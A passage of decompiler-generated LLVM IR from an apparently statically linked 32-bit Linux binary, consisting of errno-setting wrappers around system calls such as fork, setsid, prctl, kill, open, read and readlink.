  br i1 %v1_80520af, label %dec_label_pc_8052029, label %dec_label_pc_80520b5

dec_label_pc_80520b5:                             ; preds = %dec_label_pc_80520ad
  %v1_80520b7 = sub i32 0, %v4_805200b
  br label %dec_label_pc_805202d

dec_label_pc_80520c5:                             ; preds = %dec_label_pc_8052059
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  store i32 %v3_8052059, i32* %edx.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052074

; uselistorder directives
  uselistorder i32 %v1_805207a, { 1, 0 }
  uselistorder i32 %v1_8052079, { 1, 0 }
  uselistorder i32 %v1_8052064, { 0, 1, 3, 2 }
  uselistorder i32 %v3_8052059, { 5, 0, 1, 2, 3, 6, 4, 7, 8 }
  uselistorder i32 %div19, { 1, 2, 0 }
  uselistorder i32 %v1_805204b, { 1, 0 }
  uselistorder i32 %v4_805200b, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32* %ecx.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %ebx.global-to-local, { 0, 5, 1, 2, 3, 4, 6, 7, 8 }
  uselistorder i8 45, { 2, 0, 1 }
  uselistorder i32 %arg3, { 5, 2, 3, 4, 6, 7, 0, 1, 8, 9, 10 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052074, { 0, 2, 1 }
}

define i32 @function_80520cd(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80520cd:
  %ebx.global-to-local = alloca i32, align 4
  %v0_80520cd = load i32, i32* @edi, align 4
  %v0_80520ce = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_80520e2 = add i32 %arg2, -12
  %v6_80520ec = icmp ugt i32 %v1_80520e2, 2
  br i1 %v6_80520ec, label %dec_label_pc_80520fc, label %dec_label_pc_80520ee

dec_label_pc_80520ee:                             ; preds = %dec_label_pc_80520cd
  %v4_80520f2 = call i32 @function_8052124(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_80520e2)
  br label %dec_label_pc_805211e

dec_label_pc_80520fc:                             ; preds = %dec_label_pc_80520cd
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8052104 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_8052104, i32* %ebx.global-to-local, align 4
  %tmp17 = icmp ult i32 %v2_8052104, -4095
  br i1 %tmp17, label %dec_label_pc_805211c, label %dec_label_pc_8052110

dec_label_pc_8052110:                             ; preds = %dec_label_pc_80520fc
  %v1_8052110 = call i32 @function_80526c9(i32 %v0_80520ce)
  %v0_8052115 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052115 = sub i32 0, %v0_8052115
  %v2_8052117 = inttoptr i32 %v1_8052110 to i32*
  store i32 %v1_8052115, i32* %v2_8052117, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805211c

dec_label_pc_805211c:                             ; preds = %dec_label_pc_80520fc, %dec_label_pc_8052110
  %v0_805211c = phi i32 [ %v2_8052104, %dec_label_pc_80520fc ], [ -1, %dec_label_pc_8052110 ]
  br label %dec_label_pc_805211e

dec_label_pc_805211e:                             ; preds = %dec_label_pc_80520ee, %dec_label_pc_805211c
  %v0_8052123 = phi i32 [ %v4_80520f2, %dec_label_pc_80520ee ], [ %v0_805211c, %dec_label_pc_805211c ]
  store i32 %v0_80520ce, i32* @ebx, align 4
  store i32 %v0_80520cd, i32* @edi, align 4
  ret i32 %v0_8052123

; uselistorder directives
  uselistorder i32 %v2_8052104, { 1, 0, 2 }
  uselistorder i32 %v0_80520ce, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_805211e, { 1, 0 }
  uselistorder label %dec_label_pc_805211c, { 1, 0 }
}

define i32 @function_8052124(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052124:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052124 = load i32, i32* @edi, align 4
  store i32 %v0_8052124, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_805213c = load i32, i32* @ebx, align 4
  %v1_8052144 = call i32 @int80_syscall(i32 221)
  store i32 %v1_8052144, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_8052144, -4095
  br i1 %tmp12, label %dec_label_pc_805215c, label %dec_label_pc_8052150

dec_label_pc_8052150:                             ; preds = %dec_label_pc_8052124
  %v1_8052150 = call i32 @function_80526c9(i32 %v0_805213c)
  %v0_8052155 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052155 = sub i32 0, %v0_8052155
  %v2_8052157 = inttoptr i32 %v1_8052150 to i32*
  store i32 %v1_8052155, i32* %v2_8052157, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8052161.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805215c

dec_label_pc_805215c:                             ; preds = %dec_label_pc_8052124, %dec_label_pc_8052150
  %v2_8052161 = phi i32 [ %v0_8052124, %dec_label_pc_8052124 ], [ %v2_8052161.pre, %dec_label_pc_8052150 ]
  %v0_805215c = phi i32 [ %v1_8052144, %dec_label_pc_8052124 ], [ -1, %dec_label_pc_8052150 ]
  store i32 %v2_8052161, i32* %edi.global-to-local, align 4
  ret i32 %v0_805215c

; uselistorder directives
  uselistorder i32 %v1_8052144, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805215c, { 1, 0 }
}

define i32 @function_8052163(i8* %arg1) local_unnamed_addr {
dec_label_pc_8052163:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052163 = load i32, i32* @edi, align 4
  store i32 %v0_8052163, i32* %stack_var_-4, align 4
  %v4_8052167 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052167, i32* %edi.global-to-local, align 4
  %v0_805216b = load i32, i32* @ebx, align 4
  %v3_8052173 = call i32 @chdir(i8* %arg1)
  store i32 %v3_8052173, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_8052173, -4095
  br i1 %tmp9, label %dec_label_pc_805218b, label %dec_label_pc_805217f

dec_label_pc_805217f:                             ; preds = %dec_label_pc_8052163
  %v1_805217f = call i32 @function_80526c9(i32 %v0_805216b)
  %v0_8052184 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052184 = sub i32 0, %v0_8052184
  %v2_8052186 = inttoptr i32 %v1_805217f to i32*
  store i32 %v1_8052184, i32* %v2_8052186, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_805218f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805218b

dec_label_pc_805218b:                             ; preds = %dec_label_pc_8052163, %dec_label_pc_805217f
  %v2_805218f = phi i32 [ %v0_8052163, %dec_label_pc_8052163 ], [ %v2_805218f.pre, %dec_label_pc_805217f ]
  %v0_805218b = phi i32 [ %v3_8052173, %dec_label_pc_8052163 ], [ -1, %dec_label_pc_805217f ]
  store i32 %v2_805218f, i32* %edi.global-to-local, align 4
  ret i32 %v0_805218b

; uselistorder directives
  uselistorder i32 %v3_8052173, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805218b, { 1, 0 }
}

define i32 @function_8052191(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052191:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052191 = load i32, i32* @edi, align 4
  store i32 %v0_8052191, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8052199 = load i32, i32* @ebx, align 4
  %v1_80521a1 = call i32 @close(i32 %arg1)
  store i32 %v0_8052199, i32* @ebx, align 4
  store i32 %v1_80521a1, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_80521a1, -4095
  br i1 %tmp9, label %dec_label_pc_80521b9, label %dec_label_pc_80521ad

dec_label_pc_80521ad:                             ; preds = %dec_label_pc_8052191
  %v1_80521ad = call i32 @function_80526c9(i32 %v0_8052199)
  %v0_80521b2 = load i32, i32* %edi.global-to-local, align 4
  %v1_80521b2 = sub i32 0, %v0_80521b2
  %v2_80521b4 = inttoptr i32 %v1_80521ad to i32*
  store i32 %v1_80521b2, i32* %v2_80521b4, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_80521bd.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80521b9

dec_label_pc_80521b9:                             ; preds = %dec_label_pc_8052191, %dec_label_pc_80521ad
  %v2_80521bd = phi i32 [ %v0_8052191, %dec_label_pc_8052191 ], [ %v2_80521bd.pre, %dec_label_pc_80521ad ]
  %v0_80521b9 = phi i32 [ %v1_80521a1, %dec_label_pc_8052191 ], [ -1, %dec_label_pc_80521ad ]
  %v2_80521bb = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80521bb, i32* @edx, align 4
  store i32 %v2_80521bd, i32* @edi, align 4
  ret i32 %v0_80521b9

; uselistorder directives
  uselistorder i32 %v1_80521a1, { 1, 0, 2 }
  uselistorder i32 %v0_8052199, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80521b9, { 1, 0 }
}

define i32 @function_80521bf() local_unnamed_addr {
dec_label_pc_80521bf:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80521bf = load i32, i32* @ebx, align 4
  store i32 %v0_80521bf, i32* %stack_var_-4, align 4
  %v1_80521c8 = call i32 @fork(i32 %v0_80521bf)
  store i32 %v1_80521c8, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_80521c8, -4095
  br i1 %tmp7, label %dec_label_pc_80521df, label %dec_label_pc_80521d3

dec_label_pc_80521d3:                             ; preds = %dec_label_pc_80521bf
  %v1_80521d3 = call i32 @function_80526c9(i32 %v0_80521bf)
  %v0_80521d8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80521d8 = sub i32 0, %v0_80521d8
  %v2_80521da = inttoptr i32 %v1_80521d3 to i32*
  store i32 %v1_80521d8, i32* %v2_80521da, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80521e3.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80521df

dec_label_pc_80521df:                             ; preds = %dec_label_pc_80521bf, %dec_label_pc_80521d3
  %v2_80521e3 = phi i32 [ %v0_80521bf, %dec_label_pc_80521bf ], [ %v2_80521e3.pre, %dec_label_pc_80521d3 ]
  %v0_80521df = phi i32 [ %v1_80521c8, %dec_label_pc_80521bf ], [ -1, %dec_label_pc_80521d3 ]
  store i32 %v2_80521e3, i32* @ebx, align 4
  ret i32 %v0_80521df

; uselistorder directives
  uselistorder i32 %v1_80521c8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80521df, { 1, 0 }
}

define i32 @function_80521e5() local_unnamed_addr {
dec_label_pc_80521e5:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80521e5 = load i32, i32* @ebx, align 4
  store i32 %v0_80521e5, i32* %stack_var_-4, align 4
  %v1_80521ee = call i32 @getpid(i32 %v0_80521e5)
  store i32 %v1_80521ee, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_80521ee, -4095
  br i1 %tmp7, label %dec_label_pc_8052205, label %dec_label_pc_80521f9

dec_label_pc_80521f9:                             ; preds = %dec_label_pc_80521e5
  %v1_80521f9 = call i32 @function_80526c9(i32 %v0_80521e5)
  %v0_80521fe = load i32, i32* %ebx.global-to-local, align 4
  %v1_80521fe = sub i32 0, %v0_80521fe
  %v2_8052200 = inttoptr i32 %v1_80521f9 to i32*
  store i32 %v1_80521fe, i32* %v2_8052200, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8052209.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052205

dec_label_pc_8052205:                             ; preds = %dec_label_pc_80521e5, %dec_label_pc_80521f9
  %v2_8052209 = phi i32 [ %v0_80521e5, %dec_label_pc_80521e5 ], [ %v2_8052209.pre, %dec_label_pc_80521f9 ]
  %v0_8052205 = phi i32 [ %v1_80521ee, %dec_label_pc_80521e5 ], [ -1, %dec_label_pc_80521f9 ]
  %v2_8052207 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052207, i32* @edx, align 4
  store i32 %v2_8052209, i32* @ebx, align 4
  ret i32 %v0_8052205

; uselistorder directives
  uselistorder i32 %v1_80521ee, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052205, { 1, 0 }
}

define i32 @function_805220b() local_unnamed_addr {
dec_label_pc_805220b:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805220b = load i32, i32* @ebx, align 4
  store i32 %v0_805220b, i32* %stack_var_-4, align 4
  %v1_8052214 = call i32 @getppid(i32 %v0_805220b)
  store i32 %v1_8052214, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8052214, -4095
  br i1 %tmp7, label %dec_label_pc_805222b, label %dec_label_pc_805221f

dec_label_pc_805221f:                             ; preds = %dec_label_pc_805220b
  %v1_805221f = call i32 @function_80526c9(i32 %v0_805220b)
  %v0_8052224 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052224 = sub i32 0, %v0_8052224
  %v2_8052226 = inttoptr i32 %v1_805221f to i32*
  store i32 %v1_8052224, i32* %v2_8052226, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805222f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805222b

dec_label_pc_805222b:                             ; preds = %dec_label_pc_805220b, %dec_label_pc_805221f
  %v2_805222f = phi i32 [ %v0_805220b, %dec_label_pc_805220b ], [ %v2_805222f.pre, %dec_label_pc_805221f ]
  %v0_805222b = phi i32 [ %v1_8052214, %dec_label_pc_805220b ], [ -1, %dec_label_pc_805221f ]
  %v2_805222d = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805222d, i32* @edx, align 4
  store i32 %v2_805222f, i32* @ebx, align 4
  ret i32 %v0_805222b

; uselistorder directives
  uselistorder i32 %v1_8052214, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805222b, { 1, 0 }
}

define i32 @function_8052231(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052231:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052231 = load i32, i32* @edi, align 4
  store i32 %v0_8052231, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8052249 = load i32, i32* @ebx, align 4
  %v2_8052251 = call i32 (i32, i32, ...) @ioctl(i32 %arg1, i32 %arg2)
  store i32 %v2_8052251, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v2_8052251, -4095
  br i1 %tmp12, label %dec_label_pc_8052269, label %dec_label_pc_805225d

dec_label_pc_805225d:                             ; preds = %dec_label_pc_8052231
  %v1_805225d = call i32 @function_80526c9(i32 %v0_8052249)
  %v0_8052262 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052262 = sub i32 0, %v0_8052262
  %v2_8052264 = inttoptr i32 %v1_805225d to i32*
  store i32 %v1_8052262, i32* %v2_8052264, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_805226e.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052269

dec_label_pc_8052269:                             ; preds = %dec_label_pc_8052231, %dec_label_pc_805225d
  %v2_805226e = phi i32 [ %v0_8052231, %dec_label_pc_8052231 ], [ %v2_805226e.pre, %dec_label_pc_805225d ]
  %v0_8052269 = phi i32 [ %v2_8052251, %dec_label_pc_8052231 ], [ -1, %dec_label_pc_805225d ]
  store i32 %v2_805226e, i32* %edi.global-to-local, align 4
  ret i32 %v0_8052269

; uselistorder directives
  uselistorder i32 %v2_8052251, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052269, { 1, 0 }
}

define i32 @function_8052270(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052270:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052270 = load i32, i32* @ebx, align 4
  store i32 %v0_8052270, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8052283 = call i32 @kill(i32 %arg1, i32 %arg2)
  store i32 %v2_8052283, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_8052283, -4095
  br i1 %tmp9, label %dec_label_pc_805229c, label %dec_label_pc_8052290

dec_label_pc_8052290:                             ; preds = %dec_label_pc_8052270
  %v1_8052290 = call i32 @function_80526c9(i32 %v0_8052270)
  %v0_8052295 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052295 = sub i32 0, %v0_8052295
  %v2_8052297 = inttoptr i32 %v1_8052290 to i32*
  store i32 %v1_8052295, i32* %v2_8052297, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80522a0.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805229c

dec_label_pc_805229c:                             ; preds = %dec_label_pc_8052270, %dec_label_pc_8052290
  %v2_80522a0 = phi i32 [ %v0_8052270, %dec_label_pc_8052270 ], [ %v2_80522a0.pre, %dec_label_pc_8052290 ]
  %v0_805229c = phi i32 [ %v2_8052283, %dec_label_pc_8052270 ], [ -1, %dec_label_pc_8052290 ]
  %v2_805229e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805229e, i32* @edx, align 4
  store i32 %v2_80522a0, i32* @ebx, align 4
  ret i32 %v0_805229c

; uselistorder directives
  uselistorder i32 %v2_8052283, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805229c, { 1, 0 }
}

define i32 @function_80522a2(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80522a2:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v0_80522a3 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_80522a9 = sdiv i32 %sext, 16777216
  store i32 %v4_80522a9, i32* @ecx, align 4
  %v4_80522ad = ptrtoint i8* %arg1 to i32
  %v3_80522b1 = and i32 %arg2, 64
  %v4_80522b1 = icmp eq i32 %v3_80522b1, 0
  br i1 %v4_80522b1, label %dec_label_pc_80522c2, label %dec_label_pc_80522b6

dec_label_pc_80522b6:                             ; preds = %dec_label_pc_80522a2
  %phitmp = urem i32 %tmp, 65536
  br label %dec_label_pc_80522c2

dec_label_pc_80522c2:                             ; preds = %dec_label_pc_80522a2, %dec_label_pc_80522b6
  %v0_80522c2 = phi i32 [ 0, %dec_label_pc_80522a2 ], [ %phitmp, %dec_label_pc_80522b6 ]
  store i32 %v0_80522c2, i32* @edx, align 4
  store i32 %v4_80522ad, i32* %ebx.global-to-local, align 4
  %v5_80522cd = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_80522a9)
  store i32 %v5_80522cd, i32* %ebx.global-to-local, align 4
  %tmp16 = icmp ult i32 %v5_80522cd, -4095
  br i1 %tmp16, label %dec_label_pc_80522e5, label %dec_label_pc_80522d9

dec_label_pc_80522d9:                             ; preds = %dec_label_pc_80522c2
  %v1_80522d9 = call i32 @function_80526c9(i32 %v0_80522a3)
  %v0_80522de = load i32, i32* %ebx.global-to-local, align 4
  %v1_80522de = sub i32 0, %v0_80522de
  %v2_80522e0 = inttoptr i32 %v1_80522d9 to i32*
  store i32 %v1_80522de, i32* %v2_80522e0, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80522e5

dec_label_pc_80522e5:                             ; preds = %dec_label_pc_80522c2, %dec_label_pc_80522d9
  %v0_80522e5 = phi i32 [ %v5_80522cd, %dec_label_pc_80522c2 ], [ -1, %dec_label_pc_80522d9 ]
  store i32 %v0_80522a3, i32* @ebx, align 4
  ret i32 %v0_80522e5

; uselistorder directives
  uselistorder i32 %v5_80522cd, { 1, 0, 2 }
  uselistorder i32 %v4_80522a9, { 1, 0 }
  uselistorder i32 %v0_80522a3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80522e5, { 1, 0 }
  uselistorder label %dec_label_pc_80522c2, { 1, 0 }
}

define i32 @function_80522ed(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_80522ed:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80522ee = load i32, i32* @esi, align 4
  store i32 %v0_80522ee, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8052306 = load i32, i32* @ebx, align 4
  %v5_805230e = call i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5)
  store i32 %v5_805230e, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v5_805230e, -4095
  br i1 %tmp12, label %dec_label_pc_8052326, label %dec_label_pc_805231a

dec_label_pc_805231a:                             ; preds = %dec_label_pc_80522ed
  %v1_805231a = call i32 @function_80526c9(i32 %v0_8052306)
  %v0_805231f = load i32, i32* %esi.global-to-local, align 4
  %v1_805231f = sub i32 0, %v0_805231f
  %v2_8052321 = inttoptr i32 %v1_805231a to i32*
  store i32 %v1_805231f, i32* %v2_8052321, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8052329.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8052326

dec_label_pc_8052326:                             ; preds = %dec_label_pc_80522ed, %dec_label_pc_805231a
  %v2_8052329 = phi i32 [ %v0_80522ee, %dec_label_pc_80522ed ], [ %v2_8052329.pre, %dec_label_pc_805231a ]
  %v0_8052326 = phi i32 [ %v5_805230e, %dec_label_pc_80522ed ], [ -1, %dec_label_pc_805231a ]
  store i32 %v2_8052329, i32* %esi.global-to-local, align 4
  ret i32 %v0_8052326

; uselistorder directives
  uselistorder i32 %v5_805230e, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052326, { 1, 0 }
}

define i32 @function_805232c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805232c:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805232c = load i32, i32* @edi, align 4
  store i32 %v0_805232c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_805233c = load i32, i32* @ebx, align 4
  %v4_8052344 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_805233c, i32* @ebx, align 4
  store i32 %v4_8052344, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v4_8052344, -4095
  br i1 %tmp12, label %dec_label_pc_805235c, label %dec_label_pc_8052350

dec_label_pc_8052350:                             ; preds = %dec_label_pc_805232c
  %v1_8052350 = call i32 @function_80526c9(i32 %v0_805233c)
  %v0_8052355 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052355 = sub i32 0, %v0_8052355
  %v2_8052357 = inttoptr i32 %v1_8052350 to i32*
  store i32 %v1_8052355, i32* %v2_8052357, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8052360.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805235c

dec_label_pc_805235c:                             ; preds = %dec_label_pc_805232c, %dec_label_pc_8052350
  %v2_8052360 = phi i32 [ %v0_805232c, %dec_label_pc_805232c ], [ %v2_8052360.pre, %dec_label_pc_8052350 ]
  %v0_805235c = phi i32 [ %v4_8052344, %dec_label_pc_805232c ], [ -1, %dec_label_pc_8052350 ]
  store i32 %v2_8052360, i32* @edi, align 4
  ret i32 %v0_805235c

; uselistorder directives
  uselistorder i32 %v4_8052344, { 1, 0, 2 }
  uselistorder i32 %v0_805233c, { 1, 0 }
  uselistorder label %dec_label_pc_805235c, { 1, 0 }
}

define i32 @function_8052362(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052362:
  %edi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg2 to i8*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052362 = load i32, i32* @edi, align 4
  store i32 %v0_8052362, i32* %stack_var_-4, align 4
  %v4_8052366 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052366, i32* %edi.global-to-local, align 4
  %v0_8052372 = load i32, i32* @ebx, align 4
  %v7_805237a = call i32 @readlink(i8* %arg1, i8* %tmp5, i32 %arg3)
  store i32 %v0_8052372, i32* @ebx, align 4
  store i32 %v7_805237a, i32* %edi.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_805237a, -4095
  br i1 %tmp13, label %dec_label_pc_8052392, label %dec_label_pc_8052386

dec_label_pc_8052386:                             ; preds = %dec_label_pc_8052362
  %v1_8052386 = call i32 @function_80526c9(i32 %v0_8052372)
  %v0_805238b = load i32, i32* %edi.global-to-local, align 4
  %v1_805238b = sub i32 0, %v0_805238b
  %v2_805238d = inttoptr i32 %v1_8052386 to i32*
  store i32 %v1_805238b, i32* %v2_805238d, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8052396.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052392

dec_label_pc_8052392:                             ; preds = %dec_label_pc_8052362, %dec_label_pc_8052386
  %v2_8052396 = phi i32 [ %v0_8052362, %dec_label_pc_8052362 ], [ %v2_8052396.pre, %dec_label_pc_8052386 ]
  %v0_8052392 = phi i32 [ %v7_805237a, %dec_label_pc_8052362 ], [ -1, %dec_label_pc_8052386 ]
  %v2_8052394 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052394, i32* @edx, align 4
  store i32 %v2_8052396, i32* @edi, align 4
  ret i32 %v0_8052392

; uselistorder directives
  uselistorder i32 %v7_805237a, { 1, 0, 2 }
  uselistorder i32 %v0_8052372, { 1, 0 }
  uselistorder label %dec_label_pc_8052392, { 1, 0 }
}

define i32 @function_8052398() local_unnamed_addr {
dec_label_pc_8052398:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052399 = load i32, i32* @esi, align 4
  store i32 %v0_8052399, i32* %stack_var_-8, align 4
  %v0_80523b1 = load i32, i32* @ebx, align 4
  %v1_80523b9 = call i32 @int80_syscall(i32 142)
  store i32 %v0_80523b1, i32* @ebx, align 4
  store i32 %v1_80523b9, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_80523b9, -4095
  br i1 %tmp12, label %dec_label_pc_80523d1, label %dec_label_pc_80523c5

dec_label_pc_80523c5:                             ; preds = %dec_label_pc_8052398
  %v1_80523c5 = call i32 @function_80526c9(i32 %v0_80523b1)
  %v0_80523ca = load i32, i32* %esi.global-to-local, align 4
  %v1_80523ca = sub i32 0, %v0_80523ca
  %v2_80523cc = inttoptr i32 %v1_80523c5 to i32*
  store i32 %v1_80523ca, i32* %v2_80523cc, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_80523d4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_80523d1

dec_label_pc_80523d1:                             ; preds = %dec_label_pc_8052398, %dec_label_pc_80523c5
  %v2_80523d4 = phi i32 [ %v0_8052399, %dec_label_pc_8052398 ], [ %v2_80523d4.pre, %dec_label_pc_80523c5 ]
  %v0_80523d1 = phi i32 [ %v1_80523b9, %dec_label_pc_8052398 ], [ -1, %dec_label_pc_80523c5 ]
  store i32 %v2_80523d4, i32* @esi, align 4
  ret i32 %v0_80523d1

; uselistorder directives
  uselistorder i32 %v1_80523b9, { 1, 0, 2 }
  uselistorder i32 %v0_80523b1, { 1, 0 }
  uselistorder label %dec_label_pc_80523d1, { 1, 0 }
}

define i32 @function_80523d7() local_unnamed_addr {
dec_label_pc_80523d7:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80523d7 = load i32, i32* @ebx, align 4
  store i32 %v0_80523d7, i32* %stack_var_-4, align 4
  %v1_80523e0 = call i32 @setsid(i32 %v0_80523d7)
  store i32 %v1_80523e0, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_80523e0, -4095
  br i1 %tmp7, label %dec_label_pc_80523f7, label %dec_label_pc_80523eb

dec_label_pc_80523eb:                             ; preds = %dec_label_pc_80523d7
  %v1_80523eb = call i32 @function_80526c9(i32 %v0_80523d7)
  %v0_80523f0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80523f0 = sub i32 0, %v0_80523f0
  %v2_80523f2 = inttoptr i32 %v1_80523eb to i32*
  store i32 %v1_80523f0, i32* %v2_80523f2, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80523fb.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80523f7

dec_label_pc_80523f7:                             ; preds = %dec_label_pc_80523d7, %dec_label_pc_80523eb
  %v2_80523fb = phi i32 [ %v0_80523d7, %dec_label_pc_80523d7 ], [ %v2_80523fb.pre, %dec_label_pc_80523eb ]
